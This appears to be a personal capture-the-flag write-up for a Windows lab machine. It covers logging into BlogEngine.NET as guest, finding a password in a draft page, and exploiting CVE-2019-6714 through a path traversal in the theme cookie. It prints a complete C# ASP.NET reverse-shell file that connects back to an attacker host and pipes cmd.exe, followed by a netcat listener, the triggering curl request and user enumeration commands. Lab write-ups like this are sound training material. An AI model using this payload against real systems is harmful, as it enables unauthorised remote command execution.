
## Getting a new password from the Web Server

With the found credentials, you are able to log in as user guest on `http://MACHINE IP>/blog/Account/login.aspx?ReturnURL=/blog/admin/`.

![[image.png|317x423]]

After logging in you'll see

![[Screenshot from 2025-09-15 19-47-59.png]]

## Draft page

Go to `Draft pages` and read the page.

![[Screenshot from 2025-09-15 19-50-56.png]]

There's a pasword `Excal1burP@ss1337`.

## Accessing the Machine

### BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution

> [!Note]
>  CVE-2019-6714
>  Path traversal vulnerability leading to remote code execution.  This vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This  is caused by an unchecked "theme" parameter that is used to override  the default theme for rendering blog pages.  The vulnerable code can   be seen in this file:  /Custom/Controls/PostList.ascx.cs.
 
More info: https://www.exploit-db.com/exploits/46353

#### Uploading the exploit

#Attacking_machine 
- Create a file called `PostView.ascx`with the following content.
```
<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

	using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("<font color="#ff0000"><ATTACKING MACHINE></font>", 445)) {
		using(System.IO.Stream stream = client.GetStream()) {
			using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
				streamWriter = new System.IO.StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				System.Diagnostics.Process p = new System.Diagnostics.Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true) {
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
    	}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
   	StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    	streamWriter.WriteLine(strOutput);
                    	streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```

> [!Note]
> Change in the previous code the ATTACKING MACHINE IP. 
> Use port 445.



#Web_edito
- On the previous message where you got the password, there's an File Manager Icon. ![[Screenshot 2025-09-15 at 14-08-13 Excelibur (guest).png]]

- Enter and upload the `PostView.ascx` file.

![[Screenshot from 2025-09-15 20-11-22.png]]


#### Getting a reverse shell

#Attacking_machine 
- Open a netcat listener on port 445.
```
nc -lnvp 445
```


- Run the following code to connect to the listener.
```
curl -v --cookie "theme=../../App_Data/files/" http://<MACHINE IP>/blog/
```

![[Screenshot from 2025-09-16 12-45-33.png]]


#### Users

#Reverse_shell
- Run the following code to know the user and its privileges.

```
whoami
whoami /priv
```

![[Screenshot from 2025-09-16 20-28-09.png]]


![[Screenshot from 2025-09-16 20-21-37.png]]


- Run the following code to see whether there are more users or not.
```
cd c:\users && dir
```

![[Screenshot from 2025-09-16 20-33-09.png]]

There's another user called `kingarthy`.

